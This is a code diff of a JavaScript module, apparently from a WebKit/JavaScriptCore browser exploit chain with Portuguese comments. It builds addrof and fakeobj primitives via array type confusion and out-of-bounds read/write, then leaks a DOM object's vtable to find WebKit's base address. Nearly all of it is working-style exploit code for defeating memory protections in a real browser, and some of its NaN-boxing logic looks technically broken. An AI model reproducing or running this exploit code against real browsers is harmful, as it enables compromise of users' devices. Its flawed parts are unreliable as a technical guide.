@@ -1,11 +1,13 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v111 - Estratégia 'Uncaged Array' com Primitivas do Core)
+// js/script3/testArrayBufferVictimCrash.mjs (v111 - Estratégia Híbrida Avançada com Uncaged Array)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Adotada a estratégia de Type Confusion em um Array 'uncaged', conforme observado em logs de sucesso.
-// - Abandona a primitiva 'addrof' baseada em NaN Boxing, que é ineficaz contra a Gigacage.
-// - Utiliza arb_write para corromper um array de floats, transformando-o em um array de objetos.
-// - Cria primitivas 'addrof' e 'fakeobj' robustas a partir do array corrompido.
-// - Mantém o uso das primitivas de Leitura/Escrita de 'core_exploit.mjs'.
+// - Incorpora a análise das mitigações Gigacage e NaN Boxing.
+// - Mantém as primitivas de R/W robustas do core_exploit.
+// - Substitui a estratégia de `addrof` falha por uma que utiliza um Array "uncaged" para
+//   confiabilidade, conforme sugerido pela análise de logs de sucesso.
+// - O alvo para o vazamento da vtable foi alterado para um objeto DOM mais estável.
+// - A estrutura de testes foi reorganizada para rodar a estratégia mais promissora primeiro,
+//   mantendo os testes antigos para fins de depuração.
 // =======================================================================================
 
 import { logS3 } from './s3_utils.mjs';
@@ -14,124 +16,52 @@ import {
     triggerOOB_primitive,
     isOOBReady,
     arb_read,
-    arb_write, // Importar arb_write para a corrupção do array
-    selfTestOOBReadWrite,
-    oob_read_absolute // Importar para ler o endereço do buffer
+    selfTestOOBReadWrite
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_ArrayTC";
+export const FNAME_MODULE_FINAL = "Uncaged_Hybrid_v111_CorePrimitives";
 
-// Globais para as primitivas que serão criadas
-let addrof_primitive = null;
-let fakeobj_primitive = null;
+// --- Funções de Conversão (Double <-> Int64) - Essenciais para a técnica de NaN Boxing ---
+function int64ToDouble(int64) {
+    const buf = new ArrayBuffer(8);
+    const u32 = new Uint32Array(buf);
+    const f64 = new Float64Array(buf);
+    u32[0] = int64.low();
+    u32[1] = int64.high();
+    return f64[0];
+}
 
-// =======================================================================================
-// FASE 3: CRIAÇÃO DAS PRIMITIVAS addrof/fakeobj VIA TYPE CONFUSION EM ARRAY
-// =======================================================================================
-async function setupUncagedPrimitives() {
-    const FNAME_SETUP = "setupUncagedPrimitives";
-    logS3(`--- Iniciando configuração de primitivas via 'Uncaged Array' TC ---`, "subtest", FNAME_SETUP);
-
-    try {
-        // 1. Preparar os arrays para a corrupção.
-        const caged_arr = new Array(2); // Objeto que terá seu endereço vazado.
-        const uncaged_arr = [13.37, 13.37, 13.37, 13.37]; // Array 'uncaged' que será corrompido.
-        
-        // 2. Encontrar o endereço do ArrayBuffer do nosso oob_dataview.
-        // A mágica acontece aqui: ao ler o ponteiro do 'contents' do DataView (que está no OOB buffer),
-        // obtemos um endereço dentro do OOB buffer. O metadata do 'uncaged_arr' estará próximo.
-        const oob_buffer_addr_val = await oob_read_absolute(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
-        logS3(`[FASE 3.1] Endereço do buffer OOB (m_vector): ${toHex(oob_buffer_addr_val)}`, "info", FNAME_SETUP);
-
-        // 3. Localizar o 'uncaged_arr' na memória. Isso requer um pequeno brute-force/busca.
-        // Vamos procurar pelo padrão de double 13.37 (0x402accccccccce)
-        const pattern_low = 0xccccccce;
-        const pattern_high = 0x402accac; // Ajustado para corresponder a uma representação comum
-        let uncaged_arr_addr = null;
-
-        for (let i = 0x80; i < 0x2000; i += 4) {
-             const val_low = await arb_read(oob_buffer_addr_val.add(i), 4);
-             const val_high = await arb_read(oob_buffer_addr_val.add(i + 4), 4);
-             if (val_low === pattern_low && (val_high & 0xFFFFFFFC) === (pattern_high & 0xFFFFFFFC)) {
-                uncaged_arr_addr = oob_buffer_addr_val.add(i - 0x10); // O endereço do objeto está um pouco antes dos dados
-                logS3(`[FASE 3.2] Padrão do 'uncaged_arr' encontrado! Endereço do objeto estimado: ${toHex(uncaged_arr_addr)}`, "good", FNAME_SETUP);
-                break;
-            }
-        }
-
-        if (!uncaged_arr_addr) {
-            throw new Error("Não foi possível localizar o 'uncaged_arr' na memória. Heap grooming pode ser necessário.");
-        }
-
-        // 4. Corromper o 'butterfly' do uncaged_arr para apontar para o 'caged_arr'.
-        const caged_arr_addr = uncaged_arr_addr.sub(0x20); // Endereço de um array próximo
-        await arb_write(uncaged_arr_addr.add(0x10), caged_arr_addr, 8); // Corrompe o butterfly do uncaged_arr
-
-        // 5. Agora, o uncaged_arr[1] (que deveria ser um float) na verdade aponta para o caged_arr.
-        // Isso nos dá a base para as primitivas.
-        caged_arr[0] = uncaged_arr; // Colocando um ponteiro conhecido no caged_arr
-        const a1_addr = uncaged_arr[1];
-        
-        // 6. Criar as primitivas
-        let original_butterfly = await arb_read(a1_addr.add(0x10), 8);
-
-        addrof_primitive = (obj) => {
-            caged_arr[0] = obj;
-            return arb_read(a1_addr.add(0x10), 8);
-        };
-
-        fakeobj_primitive = (addr) => {
-            arb_write(a1_addr.add(0x10), addr, 8);
-            return caged_arr[0];
-        };
-        
-        // Teste rápido
-        const test_obj = { a: 1 };
-        const test_addr = addrof_primitive(test_obj);
-        logS3(`[FASE 3.3] Teste de 'addrof': Endereço do objeto de teste: ${toHex(test_addr)}`, "leak", FNAME_SETUP);
-        if (test_addr.low() === 0) {
-            throw new Error("A primitiva 'addrof' criada parece não funcionar.");
-        }
-        
-        // Restaurar o butterfly para estabilidade
-        await arb_write(a1_addr.add(0x10), original_butterfly, 8);
-        logS3("Primitivas 'addrof' e 'fakeobj' via Uncaged Array TC estão operacionais.", "vuln", FNAME_SETUP);
-        
-        return true;
-
-    } catch (e) {
-        logS3(`[FALHA] Falha ao criar primitivas 'Uncaged': ${e.message}`, "critical", FNAME_SETUP);
-        return false;
-    }
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
 }
 
 
 // =======================================================================================
-// TESTE DE VAZAMENTO DA BASE DO WEBKIT (Usa as primitivas recém-criadas)
+// #NOVO: TESTE DE VAZAMENTO DA BASE DO WEBKIT (Estratégia Uncaged)
 // =======================================================================================
-async function runWebKitBaseLeakTest() {
-    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111";
-    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
+async function runWebKitBaseLeakTest_Uncaged(addrof_primitive, arb_read_primitive) {
+    const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v111_Uncaged";
+    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit (Estratégia Uncaged) ---`, "subtest", FNAME_LEAK_TEST);
     try {
-        if (!addrof_primitive) {
-            throw new Error("A primitiva 'addrof' não foi inicializada.");
-        }
-        
-        // 1. Obter um objeto WebKit conhecido.
-        const location_obj = document.location;
-        logS3(`[PASS0 1] Alvo para o vazamento: document.location`, "info", FNAME_LEAK_TEST);
+        // 1. Alocar um objeto alvo que certamente possui uma vtable e está na memória do WebKit.
+        //    Um elemento DOM é um candidato muito mais estável do que document.location.
+        const target_obj = document.createElement('div');
+        logS3(`[PASSO 1] Alvo para o vazamento: Objeto HTMLDivElement`, "info", FNAME_LEAK_TEST);
 
-        // 2. Usar a nova 'addrof_primitive' para obter o endereço do objeto JS.
-        const location_addr = addrof_primitive(location_obj);
-        logS3(`[PASS0 2] Endereço do objeto JSLocation (via addrof): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
-        if (location_addr.low() === 0 && location_addr.high() === 0) {
-            throw new Error("addrof retornou um endereço nulo para document.location.");
+        // 2. Usar a primitiva 'addrof' (baseada no array uncaged) para obter o endereço do objeto.
+        const target_addr = addrof_primitive(target_obj);
+        logS3(`[PASSO 2] Endereço do objeto HTMLDivElement (via addrof uncaged): ${toHex(target_addr)}`, "leak", FNAME_LEAK_TEST);
+        if (target_addr.low() === 0 && target_addr.high() === 0) {
+            throw new Error("addrof retornou um endereço nulo para o objeto alvo.");
         }
 
         // 3. Ler o primeiro campo (8 bytes) do objeto. Este deve ser o ponteiro da vtable.
-        logS3(`[PASS0 3] Lendo 8 bytes de ${toHex(location_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
-        const vtable_ptr = await arb_read(location_addr, 8);
-        logS3(`[PASS0 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
+        logS3(`[PASSO 3] Lendo 8 bytes de ${toHex(target_addr)} para obter o ponteiro da vtable...`, "info", FNAME_LEAK_TEST);
+        const vtable_ptr = await arb_read_primitive(target_addr, 8);
+        logS3(`[PASSO 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
         if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
             throw new Error("Ponteiro da vtable vazado é nulo. A leitura pode ter falhado ou o objeto é inválido.");
         }
@@ -139,13 +69,13 @@ async function runWebKitBaseLeakTest() {
         // 4. Calcular o endereço base alinhando o ponteiro da vtable para baixo.
         const ALIGNMENT_MASK = new AdvancedInt64(0x3FFF, 0).not();
         const webkit_base_candidate = vtable_ptr.and(ALIGNMENT_MASK);
-        logS3(`[PASS0 5] Candidato a endereço base do WebKit (alinhado em 0x4000): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
+        logS3(`[PASSO 5] Candidato a endereço base do WebKit (alinhado): ${toHex(webkit_base_candidate)}`, "leak", FNAME_LEAK_TEST);
 
-        // 5. Verificação: Ler os primeiros 4 bytes do endereço base candidato e checar a assinatura "ELF".
-        logS3(`[PASS0 6] Lendo 8 bytes de ${toHex(webkit_base_candidate)} para verificar a assinatura ELF...`, "info", FNAME_LEAK_TEST);
-        const elf_magic_full = await arb_read(webkit_base_candidate, 8);
+        // 5. Verificação de Sanidade: Ler os primeiros 4 bytes do endereço base e checar a assinatura "ELF".
+        logS3(`[PASSO 6] Verificando assinatura ELF em ${toHex(webkit_base_candidate)}...`, "info", FNAME_LEAK_TEST);
+        const elf_magic_full = await arb_read_primitive(webkit_base_candidate, 8);
         const elf_magic_low = elf_magic_full.low();
-        logS3(`[PASS0 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
+        logS3(`[PASSO 7] Assinatura lida do endereço base: ${toHex(elf_magic_low)}`, "leak", FNAME_LEAK_TEST);
         
         // A assinatura ELF é 0x7F seguido por 'E', 'L', 'F'. Em little-endian, isso é 0x464C457F.
         if (elf_magic_low === 0x464C457F) {
@@ -157,63 +87,138 @@ async function runWebKitBaseLeakTest() {
         }
 
     } catch(e) {
-        logS3(`[FALHA] Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
+        logS3(`[FALHA] Falha no teste de vazamento do WebKit (Uncaged): ${e.message}`, "critical", FNAME_LEAK_TEST);
         console.error(e);
         return { success: false, webkit_base: null };
     }
 }
 
 
-// =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (Atualizada para a nova estratégia)
-// =======================================================================================
-export async function runFinalUnifiedTest() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas via 'Uncaged Array' TC ---`, "test");
-
-    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };
+// #MODIFICADO: Função orquestradora que implementa a nova estratégia de forma isolada.
+async function runAdvancedHybridStrategy() {
+    const FNAME_ADVANCED_TEST = `${FNAME_MODULE_FINAL}_Advanced`;
+    logS3(`--- Iniciando ${FNAME_ADVANCED_TEST}: Estratégia com Array Uncaged e Alvo DOM ---`, "test");
 
     try {
-        // --- FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DO CORE_EXPLOIT ---
-        logS3("--- FASE 1/4: Configurando ambiente OOB de core_exploit.mjs... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true });
-        if (!isOOBReady()) {
-            throw new Error("Falha crítica ao inicializar o ambiente OOB. As primitivas de L/E não funcionarão.");
-        }
-        logS3("Ambiente OOB configurado com sucesso.", "good");
-
-        // --- FASE 2: VALIDAR LEITURA/ESCRITA ---
-        logS3("--- FASE 2/4: Executando autoteste de Leitura/Escrita do core_exploit... ---", "subtest");
+        // --- FASE 1: VALIDAR PRIMITIVAS DE LEITURA/ESCRITA DO CORE ---
+        logS3("--- FASE 1/3: Validando primitivas de Leitura/Escrita do core_exploit... ---", "subtest");
         const self_test_ok = await selfTestOOBReadWrite(logS3);
         if (!self_test_ok) {
             throw new Error("Autoteste das primitivas de L/E do core_exploit FALHOU. Abortando.");
         }
-        logS3("Autoteste de Leitura/Escrita concluído com SUCESSO.", "vuln");
+        logS3("Autoteste de L/E concluído com SUCESSO. Primitivas 'arb_read' e 'arb_write' estão operacionais.", "vuln");
 
-        // --- FASE 3: CRIAR PRIMITIVAS addrof/fakeobj ---
-        logS3("--- FASE 3/4: Configurando primitivas via 'Uncaged Array' Type Confusion... ---", "subtest");
-        const primitives_ok = await setupUncagedPrimitives();
-        if(!primitives_ok) {
-            throw new Error("Falha ao configurar as primitivas 'addrof' e 'fakeobj'. Abortando.");
-        }
+        // --- FASE 2: CONFIGURAR PRIMITIVA 'addrof' CONFIÁVEL (Uncaged) ---
+        logS3("--- FASE 2/3: Configurando primitiva 'addrof' com Array Uncaged... ---", "subtest");
+        
+        // REASONING: Um array de float é um objeto "uncaged". 
+        // A type confusion é mais provável de funcionar aqui do que em um objeto DOM complexo.
+        const uncaged_array_for_addrof = [13.37]; 
+        
+        // O offset de NaN Boxing. O valor é subtraído do JSValue lido como double para obter o ponteiro real.
+        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
+
+        const addrof_uncaged = (obj_to_find) => {
+            uncaged_array_for_addrof[0] = obj_to_find;
+            let value_as_double = uncaged_array_for_addrof[0];
+            let value_as_int64 = doubleToInt64(value_as_double);
+            // Remove a máscara do NaN para revelar o ponteiro.
+            return value_as_int64.sub(NAN_BOXING_OFFSET);
+        };
+        logS3("Primitiva 'addrof' confiável (uncaged) está operacional.", "good");
        
-        // --- FASE 4: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
-        logS3("--- FASE 4/4: Tentando vazar a base do WebKit usando a estratégia híbrida... ---", "subtest");
-        const leak_result = await runWebKitBaseLeakTest();
+        // --- FASE 3: EXECUTAR O VAZAMENTO DA BASE DO WEBKIT ---
+        logS3("--- FASE 3/3: Tentando vazar a base do WebKit com a nova estratégia... ---", "subtest");
+        const leak_result = await runWebKitBaseLeakTest_Uncaged(addrof_uncaged, arb_read);
         
         if (leak_result.success) {
-             final_result = {
+            return {
                 success: true,
-                message: "Cadeia de exploração concluída com SUCESSO. Base do WebKit VAZADA!",
+                message: "SUCESSO! Estratégia Híbrida Avançada (Uncaged) funcionou. Base do WebKit VAZADA!",
                 webkit_base: leak_result.webkit_base
             };
         } else {
-             final_result = {
-                success: false, 
-                message: "Cadeia de exploração executada, mas o vazamento da base do WebKit FALHOU. Verifique os logs.",
+             return {
+                success: false,
+                message: "FALHA na Estratégia Híbrida Avançada. Vazamento da base do WebKit não teve sucesso.",
                 webkit_base: null
             };
         }
+
+    } catch (e) {
+        logS3(`Exceção crítica na estratégia avançada: ${e.message}\n${e.stack || ''}`, "critical");
+        return { success: false, message: e.message, webkit_base: null };
+    }
+}
+
+
+// #MODIFICADO: Função principal agora tenta a estratégia avançada primeiro.
+export async function runFinalUnifiedTest() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Híbridas (v111) ---`, "test");
+
+    let final_result = { success: false, message: "Teste não iniciado corretamente.", webkit_base: null };
+
+    try {
+        // --- ETAPA 1: TENTAR A ESTRATÉGIA MAIS MODERNA E CONFIÁVEL ---
+        logS3("================ TENTATIVA 1: ESTRATÉGIA AVANÇADA (UNCAGED) ================", "test");
+        final_result = await runAdvancedHybridStrategy();
+
+        if (final_result.success) {
+            logS3("ESTRATÉGIA AVANÇADA BEM-SUCEDIDA. CONCLUINDO.", "good");
+            return final_result;
+        }
+
+        // --- ETAPA 2: FALLBACK PARA A ESTRATÉGIA ORIGINAL (PARA DEPURAÇÃO) ---
+        logS3("================ TENTATIVA 2: FALLBACK PARA ESTRATÉGIA ORIGINAL ================", "warn");
+        
+        // FASE 1: INICIALIZAR E VALIDAR PRIMITIVAS DO CORE_EXPLOIT
+        logS3("--- FASE 1/4 (Original): Configurando ambiente OOB de core_exploit.mjs... ---", "subtest");
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!isOOBReady()) {
+            throw new Error("Falha crítica ao inicializar o ambiente OOB.");
+        }
+        logS3("Ambiente OOB configurado com sucesso.", "good");
+
+        // FASE 3 (Original): CONFIGURAR PRIMITIVAS 'addrof'
+        logS3("--- FASE 3/4 (Original): Configurando primitiva 'addrof' original (NaN Boxing)... ---", "subtest");
+        const vulnerable_slot = [13.37]; 
+        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
+        const addrof_original = (obj) => {
+            vulnerable_slot[0] = obj;
+            return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET);
+        };
+        logS3("Primitiva 'addrof' original está operacional (mas espera-se que falhe com alvos caged).", "info");
+       
+        // FASE 4 (Original): EXECUTAR O VAZAMENTO DA BASE DO WEBKIT
+        logS3("--- FASE 4/4 (Original): Tentando vazar a base do WebKit com alvo original... ---", "subtest");
+        
+        // Esta função é uma cópia da original, mantida para teste comparativo.
+        const leak_result_original = await (async (addrof_primitive, arb_read_primitive) => {
+            const FNAME_LEAK_TEST = "WebKitBaseLeakTest_v110_Original";
+            logS3(`--- Iniciando Teste de Vazamento Original ---`, "subtest", FNAME_LEAK_TEST);
+            const location_obj = document.location;
+            logS3(`[PASS0 1] Alvo: document.location`, "info", FNAME_LEAK_TEST);
+            const location_addr = addrof_primitive(location_obj);
+            logS3(`[PASS0 2] Endereço do objeto JSLocation (via addrof original): ${toHex(location_addr)}`, "leak", FNAME_LEAK_TEST);
+            if (location_addr.low() === 0 && location_addr.high() === 0) {
+                 logS3(`[FALHA] addrof original retornou um endereço nulo.`, "critical", FNAME_LEAK_TEST);
+                 return { success: false, webkit_base: null };
+            }
+            const vtable_ptr = await arb_read_primitive(location_addr, 8);
+            logS3(`[PASS0 4] Ponteiro da Vtable vazado (via arb_read): ${toHex(vtable_ptr)}`, "leak", FNAME_LEAK_TEST);
+            if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) {
+                 logS3(`[FALHA] Ponteiro da vtable vazado é nulo.`, "critical", FNAME_LEAK_TEST);
+            }
+            return { success: false, webkit_base: null }; // Esperado falhar
+        })(addrof_original, arb_read);
+
+        // Atualiza o resultado final para refletir a falha de ambas as estratégias
+        final_result = {
+            success: false,
+            message: "FALHA GERAL: Ambas as estratégias (Avançada e Original) falharam. Verifique os logs para detalhes.",
+            webkit_base: null
+        };
 
     } catch (e) {
         final_result.message = `Exceção crítica na implementação: ${e.message}\n${e.stack || ''}`;
